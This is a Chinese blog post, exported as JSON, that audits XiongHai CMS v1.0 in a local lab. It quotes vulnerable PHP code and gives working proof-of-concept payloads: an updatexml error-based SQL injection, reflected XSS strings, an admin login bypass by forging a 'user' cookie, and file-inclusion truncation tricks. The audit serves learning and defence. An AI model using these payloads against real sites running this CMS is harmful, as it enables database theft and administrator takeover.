{"title":"熊海cmsV1.0审计","uid":"733b83aa3a6de6561189f92e947083a6","slug":"熊海cmsV1-0审计","date":"2022-11-06T11:58:19.000Z","updated":"2022-11-06T12:09:01.874Z","comments":true,"path":"api/articles/熊海cmsV1-0审计.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>站长之家的源码库获取的代码</p>\n<p>CREATE DATABASE <code>xhcms</code> DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</p>\n<p>php5.4.45 </p>\n<p>admin admin </p>\n<p>看代码量挺少的，先试试全文</p>\n<h1 id=\"全文审计\"><a href=\"#全文审计\" class=\"headerlink\" title=\"全文审计\"></a>全文审计</h1><h2 id=\"index-php\"><a href=\"#index-php\" class=\"headerlink\" title=\"index.php\"></a>index.php</h2><p>通过r参数，传值到file文件的php里面</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n&#x2F;&#x2F;单一入口模式\nerror_reporting(0); &#x2F;&#x2F;关闭错误显示\n$file&#x3D;addslashes($_GET[&#39;r&#39;]); &#x2F;&#x2F;接收文件名\n$action&#x3D;$file&#x3D;&#x3D;&#39;&#39;?&#39;index&#39;:$file; &#x2F;&#x2F;判断为空或者等于index\necho $action; &#x2F;&#x2F;方便看传入内容添加的\ninclude(&#39;files&#x2F;&#39;.$action.&#39;.php&#39;); &#x2F;&#x2F;载入相应文件\n?&gt;</code></pre>\n\n<p>好像有目录穿越漏洞，再WWW目录下新建一个1.php，内容为aaaa。。。</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/44.png\"></p>\n<p>成功读取文件内容</p>\n<p>但是后缀是php，看看能不能截断后缀</p>\n<p><a href=\"https://www.cnblogs.com/nanamiblog/p/14369476.html\">https://www.cnblogs.com/nanamiblog/p/14369476.html</a></p>\n<ol>\n<li><strong>%00截断 php&lt;5.3</strong></li>\n</ol>\n<p>php版本是5.4.45，或GPC为off，%00截断就不行了，还有使用了addslashes()函数也不行</p>\n<ol>\n<li><strong>垃圾字符截断  php&lt;5.3</strong></li>\n</ol>\n<p>win 使用./ 填充259次</p>\n<p>linux 使用./填充2038次</p>\n<ol>\n<li><strong>开启远程文件包含的情况下通过?好截断</strong></li>\n</ol>\n<p>?r=<a href=\"http://xxx/1.txt\">http://xxx/1.txt</a>?</p>\n<p>将后面的?当作参数，前面的内容返回不影响</p>\n<p>那现在暂时没什么用了，跳过，看看后面的文件能不能有点用</p>\n<p>可以看到，默认包含的file文件夹下，现在直接看file文件夹的内容</p>\n<p>代码审计星球里提到的利用方式：<a href=\"https://t.zsxq.com/07JS1dEcQ\">https://t.zsxq.com/07JS1dEcQ</a></p>\n<p>还可以试试伪协议，包含日志，环境变量</p>\n<p>上传功能只有后台有，gg</p>\n<h2 id=\"files-index-php\"><a href=\"#files-index-php\" class=\"headerlink\" title=\"files/index.php\"></a>files/index.php</h2><p>包含了inc/301.php，inc/conn.php，inc/time.class.php</p>\n<p>301的内容为空</p>\n<p>conn中是数据库配置</p>\n<p>time.class是一个时间转换函数</p>\n<p>后面又包含template\\header.php，里面只是模板输出</p>\n<p>template\\footer.php，也是模板输出</p>\n<p>没有可控变量，直接过</p>\n<h2 id=\"files-about-php\"><a href=\"#files-about-php\" class=\"headerlink\" title=\"files/about.php\"></a>files/about.php</h2><p>包含</p>\n<p>conn，time.class</p>\n<p>第一个sql语句引号包裹，经过过滤</p>\n<p>包含template下所有文件，全是模板输出</p>\n<p>没有内容了</p>\n<p>只能通过index的r参数访问，直接访问会报错，包含文件路径的问题</p>\n<h2 id=\"files-contact-php\"><a href=\"#files-contact-php\" class=\"headerlink\" title=\"files/contact.php\"></a>files/contact.php</h2><p>conn，time.class等</p>\n<p>其中只有page参数可控，且进行了echo，有反射xss</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$page&#x3D;addslashes($_GET[&#39;page&#39;]);\nif ($page&lt;&gt;&quot;&quot;)&#123;\nif ($page&lt;&gt;1)&#123;\n$pages&#x3D;&quot;第&quot;.$page.&quot;页 - &quot;;\n&#125;\n&#125;</code></pre>\n\n<p>输出语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;title&gt;&lt;?php echo $navs[&#39;name&#39;]?&gt; - &lt;?php echo $pages.$info[&#39;name&#39;]?&gt;&lt;&#x2F;title&gt;</code></pre>\n\n<p>直接传参?r=contact&amp;page=<script>alert(1)</script></p>\n<p>弹窗了</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/45.png\"></p>\n<p>其他的值都是经过数学计算处理之后才传入的sql语句</p>\n<h2 id=\"files-content-php\"><a href=\"#files-content-php\" class=\"headerlink\" title=\"files/content.php\"></a>files/content.php</h2><p>包含一样的就不写了</p>\n<p>第二个可控的sql语句有数字型注入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$id&#x3D;addslashes($_GET[&#39;cid&#39;]);</code></pre>\n\n<p>sql语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;&#x2F;浏览计数\n$query &#x3D; &quot;UPDATE content SET hit &#x3D; hit+1 WHERE id&#x3D;$id&quot;;\n@mysql_query($query) or die(&#39;修改错误：&#39;.mysql_error());</code></pre>\n\n<p>这里存在报错注入</p>\n<p>payload：?r=content&amp;cid=9 and updatexml(1,concat(0x7e,database(),0x7e),1)</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/46.png\"></p>\n<p>同时也echo了这个id，反射xss</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;form  name&#x3D;&quot;form&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;&#x2F;?r&#x3D;submit&amp;type&#x3D;comment&amp;cid&#x3D;&lt;?php echo $id?&gt;&quot;&gt;</code></pre>\n\n<p>payload：?r=content&amp;cid=<script>alert(1)</script></p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/47.png\"></p>\n<h2 id=\"files-download-php\"><a href=\"#files-download-php\" class=\"headerlink\" title=\"files/download.php\"></a>files/download.php</h2><p>同前面一样有个echo 反射xss</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">$yemas&#x3D;$_GET[&#39;page&#39;];\nif ($yemas&lt;&gt;&quot;&quot;)&#123;\n$yema&#x3D;&quot; - 第 $yemas 页&quot;;\n&#125;else&#123;\n$yema&#x3D;&quot;&quot;;\t\n&#125;\n\n&lt;?php echo $yema ?&gt;</code></pre>\n\n<p>不验证了</p>\n<h2 id=\"files-downloads-php\"><a href=\"#files-downloads-php\" class=\"headerlink\" title=\"files/downloads.php\"></a>files/downloads.php</h2><p>文件下载的，没看出说明问题</p>\n<h2 id=\"files-list-php\"><a href=\"#files-list-php\" class=\"headerlink\" title=\"files/list.php\"></a>files/list.php</h2><p>反射xss</p>\n<h2 id=\"files-pages-php\"><a href=\"#files-pages-php\" class=\"headerlink\" title=\"files/pages.php\"></a>files/pages.php</h2><p>没啥问题</p>\n<h2 id=\"files-software-php\"><a href=\"#files-software-php\" class=\"headerlink\" title=\"files/software.php\"></a>files/software.php</h2><p>有报错注入，update语句，跟前面那个一样</p>\n<p>后面又有一个echo xss</p>\n<h2 id=\"files-submit-php\"><a href=\"#files-submit-php\" class=\"headerlink\" title=\"files/submit.php\"></a>files/submit.php</h2><p>post提交的没有过滤，好多注入点</p>\n<p>其中提交的cid有多个注入的语句</p>\n<p>不验证了</p>\n<h2 id=\"inc-checklogin-php\"><a href=\"#inc-checklogin-php\" class=\"headerlink\" title=\"inc/checklogin.php\"></a>inc/checklogin.php</h2><p>这个检测可以伪造</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n$user&#x3D;$_COOKIE[&#39;user&#39;];\nif ($user&#x3D;&#x3D;&quot;&quot;)&#123;\nheader(&quot;Location: ?r&#x3D;login&quot;);\nexit;\t\n&#125;\n?&gt;</code></pre>\n\n<p>可以看到只要cookie的内容里有user字段的值就能绕过登陆检查</p>\n<p>将里面的跳转去掉，添加一句echo ‘没有绕过’;</p>\n<p>在新建一个test.php，包含登录检查</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\ninclude &#39;inc&#x2F;checklogin.php&#39;;\necho &#39;绕过了&#39;;\n?&gt;</code></pre>\n\n<p>正常访问，显示的是没有绕过</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/48.png\"></p>\n<p>当添加user字段后，就绕过了</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/49.png\"></p>\n<p>其实这个应该一眼就看出来了，验证是防止误判，仔细一点总是好的</p>\n<h2 id=\"admin-index-php\"><a href=\"#admin-index-php\" class=\"headerlink\" title=\"admin/index.php\"></a>admin/index.php</h2><p>跟index.php一样的，但是这里使用了上面的checklogin.php验证登录，这不是随便进吗?</p>\n<p>添加cookie字段user=xxxx，直接进后台</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/50.png\"></p>\n<p>前面正常则通过files/login.php，看一下登录</p>\n<h2 id=\"admin-files-login-php\"><a href=\"#admin-files-login-php\" class=\"headerlink\" title=\"admin/files/login.php\"></a>admin/files/login.php</h2><p>直接用户名来了个sql注入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php \nob_start();\nrequire &#39;..&#x2F;inc&#x2F;conn.php&#39;;\n$login&#x3D;$_POST[&#39;login&#39;];\n$user&#x3D;$_POST[&#39;user&#39;];\n$password&#x3D;$_POST[&#39;password&#39;];\n$checkbox&#x3D;$_POST[&#39;checkbox&#39;];\n\nif ($login&lt;&gt;&quot;&quot;)&#123;\n$query &#x3D; &quot;SELECT * FROM manage WHERE user&#x3D;&#39;$user&#39;&quot;;</code></pre>\n\n<p>输入a’ ，直接报错</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/51.png\"></p>\n<p>后面就是一套基本操作了，可以直接sqlmap跑出来</p>\n<h2 id=\"admin-files-adset-php\"><a href=\"#admin-files-adset-php\" class=\"headerlink\" title=\"admin/files/adset.php\"></a>admin/files/adset.php</h2><p>都过滤了</p>\n<h2 id=\"admin-files-columnlist-php\"><a href=\"#admin-files-columnlist-php\" class=\"headerlink\" title=\"admin/files/columnlist.php\"></a>admin/files/columnlist.php</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\nrequire &#39;..&#x2F;inc&#x2F;checklogin.php&#39;;\nrequire &#39;..&#x2F;inc&#x2F;conn.php&#39;;\n$columnlistopen&#x3D;&#39;class&#x3D;&quot;open&quot;&#39;;\n\n$delete&#x3D;$_GET[&#39;delete&#39;];\n\n$delete2&#x3D;$_GET[&#39;delete2&#39;];\n\nif ($delete&lt;&gt;&quot;&quot;)&#123;\n$query &#x3D; &quot;DELETE FROM nav WHERE id&#x3D;&#39;$delete&#39;&quot;;\n$result &#x3D; mysql_query($query) or die(&#39;SQL语句有误：&#39;.mysql_error());\necho &quot;&lt;script&gt;alert(&#39;亲，ID为&quot;.$delete.&quot;的栏目已经成功删除！&#39;);location.href&#x3D;&#39;?r&#x3D;columnlist&#39;&lt;&#x2F;script&gt;&quot;;\nexit; \n&#125;\nif ($delete2&lt;&gt;&quot;&quot;)&#123;\n$query &#x3D; &quot;DELETE FROM navclass WHERE id&#x3D;&#39;$delete2&#39;&quot;;\n$result &#x3D; mysql_query($query) or die(&#39;SQL语句有误：&#39;.mysql_error());\necho &quot;&lt;script&gt;alert(&#39;亲，ID为&quot;.$delete2.&quot;的二级栏目已经成功删除！&#39;);location.href&#x3D;&#39;?r&#x3D;columnlist&#39;&lt;&#x2F;script&gt;&quot;;\nexit; \n&#125;\n?&gt;</code></pre>\n\n<p>两个delete参数没有过滤，直接注入</p>\n<h2 id=\"admin-files-commentlist-php\"><a href=\"#admin-files-commentlist-php\" class=\"headerlink\" title=\"admin/files/commentlist.php\"></a>admin/files/commentlist.php</h2><p>跟前一个一样，delete参数注入</p>\n<h2 id=\"admin-files-editcolumn-php\"><a href=\"#admin-files-editcolumn-php\" class=\"headerlink\" title=\"admin/files/editcolumn.php\"></a>admin/files/editcolumn.php</h2><p>有sql的地方全是注入</p>\n<h2 id=\"admin-files-editlink-php\"><a href=\"#admin-files-editlink-php\" class=\"headerlink\" title=\"admin/files/editlink.php\"></a>admin/files/editlink.php</h2><p>一样，注入</p>\n<h2 id=\"admin-files-linklist-php\"><a href=\"#admin-files-linklist-php\" class=\"headerlink\" title=\"admin/files/linklist.php\"></a>admin/files/linklist.php</h2><p>有反射xss，echo的</p>\n<p>有注入</p>\n<h2 id=\"admin-files-newlink-php\"><a href=\"#admin-files-newlink-php\" class=\"headerlink\" title=\"admin/files/newlink.php\"></a>admin/files/newlink.php</h2><p>注入</p>\n<h2 id=\"admin-files-newsoft-php\"><a href=\"#admin-files-newsoft-php\" class=\"headerlink\" title=\"admin/files/newsoft.php\"></a>admin/files/newsoft.php</h2><p>有注入，好像这些新增代码都有点问题，没写对，插入一个却报错了</p>\n<p>上传后面测</p>\n<h2 id=\"admin-files-newwz-php\"><a href=\"#admin-files-newwz-php\" class=\"headerlink\" title=\"admin/files/newwz.php\"></a>admin/files/newwz.php</h2><p>也有注入，可能语句也有问题</p>\n<h2 id=\"admin-files-reply-php\"><a href=\"#admin-files-reply-php\" class=\"headerlink\" title=\"admin/files/reply.php\"></a>admin/files/reply.php</h2><p>很多注入</p>\n<h2 id=\"admin-files-seniorset-php\"><a href=\"#admin-files-seniorset-php\" class=\"headerlink\" title=\"admin/files/seniorset.php\"></a>admin/files/seniorset.php</h2><p>注入</p>\n<h2 id=\"admin-files-siteset-php\"><a href=\"#admin-files-siteset-php\" class=\"headerlink\" title=\"admin/files/siteset.php\"></a>admin/files/siteset.php</h2><p>注入</p>\n<h2 id=\"admin-files-softlist-php\"><a href=\"#admin-files-softlist-php\" class=\"headerlink\" title=\"admin/files/softlist.php\"></a>admin/files/softlist.php</h2><p>注入，反射xss</p>\n<h2 id=\"admin-files-wzlist-php\"><a href=\"#admin-files-wzlist-php\" class=\"headerlink\" title=\"admin/files/wzlist.php\"></a>admin/files/wzlist.php</h2><p>跟上面简直一摸一样</p>\n<h1 id=\"现在看那些上传点-代码有问题，不测了\"><a href=\"#现在看那些上传点-代码有问题，不测了\" class=\"headerlink\" title=\"现在看那些上传点    代码有问题，不测了\"></a>现在看那些上传点    代码有问题，不测了</h1><p>都包含inc/up.class.php</p>\n<h2 id=\"admin-files-editsoft-php\"><a href=\"#admin-files-editsoft-php\" class=\"headerlink\" title=\"admin/files/editsoft.php\"></a>admin/files/editsoft.php</h2><p>一样，注入</p>\n<p>有上传，编辑器</p>\n<h2 id=\"admin-files-editwz-php\"><a href=\"#admin-files-editwz-php\" class=\"headerlink\" title=\"admin/files/editwz.php\"></a>admin/files/editwz.php</h2><p>内容跟上一个一样，有上传</p>\n<h2 id=\"admin-files-imageset-php\"><a href=\"#admin-files-imageset-php\" class=\"headerlink\" title=\"admin/files/imageset.php\"></a>admin/files/imageset.php</h2><p>有注入</p>\n<h2 id=\"admin-files-manageinfo-php-正常\"><a href=\"#admin-files-manageinfo-php-正常\" class=\"headerlink\" title=\"admin/files/manageinfo.php  正常\"></a>admin/files/manageinfo.php  正常</h2><p>有注入，存储型xss，先试试，确认了</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/52.png\"></p>\n<p>有上传，白名单</p>\n<p>测试伪协议发现不行，算了，多看几篇文章学学去</p>\n<h2 id=\"admin-files-newcolumn-php-编辑器\"><a href=\"#admin-files-newcolumn-php-编辑器\" class=\"headerlink\" title=\"admin/files/newcolumn.php  编辑器\"></a>admin/files/newcolumn.php  编辑器</h2><p>存储xss，sql注入</p>\n<p>保存到数据库有点问题，输入正常数据也报错</p>\n<p>有一个编辑器</p>\n<h1 id=\"吐槽：\"><a href=\"#吐槽：\" class=\"headerlink\" title=\"吐槽：\"></a>吐槽：</h1><p>可能是获取的源代码有点问题，后台上传一直在报错，不看了，后面再找找新版的源码</p>\n","text":" 站长之家的源码库获取的代码 CREATE DATABASE xhcms DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci; php5.4.45 admin admin 看代码量挺少的，先试试全文 全文审计index.php通过...","link":"","photos":[],"count_time":{"symbolsCount":"5.4k","symbolsTime":"5 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"PHP","slug":"PHP","count":7,"path":"api/tags/PHP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%A8%E6%96%87%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">全文审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#index-php\"><span class=\"toc-text\">index.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-index-php\"><span class=\"toc-text\">files&#x2F;index.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-about-php\"><span class=\"toc-text\">files&#x2F;about.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-contact-php\"><span class=\"toc-text\">files&#x2F;contact.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-content-php\"><span class=\"toc-text\">files&#x2F;content.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-download-php\"><span class=\"toc-text\">files&#x2F;download.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-downloads-php\"><span class=\"toc-text\">files&#x2F;downloads.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-list-php\"><span class=\"toc-text\">files&#x2F;list.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-pages-php\"><span class=\"toc-text\">files&#x2F;pages.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-software-php\"><span class=\"toc-text\">files&#x2F;software.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#files-submit-php\"><span class=\"toc-text\">files&#x2F;submit.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#inc-checklogin-php\"><span class=\"toc-text\">inc&#x2F;checklogin.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-index-php\"><span class=\"toc-text\">admin&#x2F;index.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-login-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;login.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-adset-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;adset.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-columnlist-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;columnlist.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-commentlist-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;commentlist.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-editcolumn-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;editcolumn.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-editlink-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;editlink.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-linklist-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;linklist.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-newlink-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;newlink.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-newsoft-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;newsoft.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-newwz-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;newwz.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-reply-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;reply.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-seniorset-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;seniorset.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-siteset-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;siteset.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-softlist-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;softlist.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-wzlist-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;wzlist.php</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%B0%E5%9C%A8%E7%9C%8B%E9%82%A3%E4%BA%9B%E4%B8%8A%E4%BC%A0%E7%82%B9-%E4%BB%A3%E7%A0%81%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E4%B8%8D%E6%B5%8B%E4%BA%86\"><span class=\"toc-text\">现在看那些上传点    代码有问题，不测了</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-editsoft-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;editsoft.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-editwz-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;editwz.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-imageset-php\"><span class=\"toc-text\">admin&#x2F;files&#x2F;imageset.php</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-manageinfo-php-%E6%AD%A3%E5%B8%B8\"><span class=\"toc-text\">admin&#x2F;files&#x2F;manageinfo.php  正常</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#admin-files-newcolumn-php-%E7%BC%96%E8%BE%91%E5%99%A8\"><span class=\"toc-text\">admin&#x2F;files&#x2F;newcolumn.php  编辑器</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%90%E6%A7%BD%EF%BC%9A\"><span class=\"toc-text\">吐槽：</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"2022小结","uid":"2c9fa563608f4b9eb0cd953103b9e032","slug":"2022小结","date":"2022-11-14T03:11:36.000Z","updated":"2022-12-01T07:03:30.747Z","comments":true,"path":"api/articles/2022小结.json","keywords":null,"cover":null,"text":" 总算是把那一本考点单词书背了一遍。 php审计入门了，还得多练。 Java安全还在入门，要点太多，特性太多，需要点时间。 最近正好学了一下数据结构和算法，用Java实现，也算是练了一点Java基础。 以前看那些搞Java安全比较出名的白帽，不懂为什么有些一直在焦虑自己菜。直到看...","link":"","photos":[],"count_time":{"symbolsCount":408,"symbolsTime":"1 mins."},"categories":[{"name":"总结","slug":"总结","count":4,"path":"api/categories/总结.json"}],"tags":[{"name":"总结","slug":"总结","count":4,"path":"api/tags/总结.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"快看cms-sql注入审计","uid":"880e1af7df287b27c3dd9350df565202","slug":"快看cms-sql注入审计","date":"2022-11-04T07:47:54.000Z","updated":"2022-11-04T10:58:13.554Z","comments":true,"path":"api/articles/快看cms-sql注入审计.json","keywords":null,"cover":[],"text":" 安装：https://github.com/erichuang2015/kkcms 直接安装 php5.6.9 数据库 kk 先直接使用Seay扫描，接下来一个一个看扫描结果 sql注入疑似点：book.php&lt;?php include(&#39;system&#x2F;...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"18 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"PHP","slug":"PHP","count":7,"path":"api/tags/PHP.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}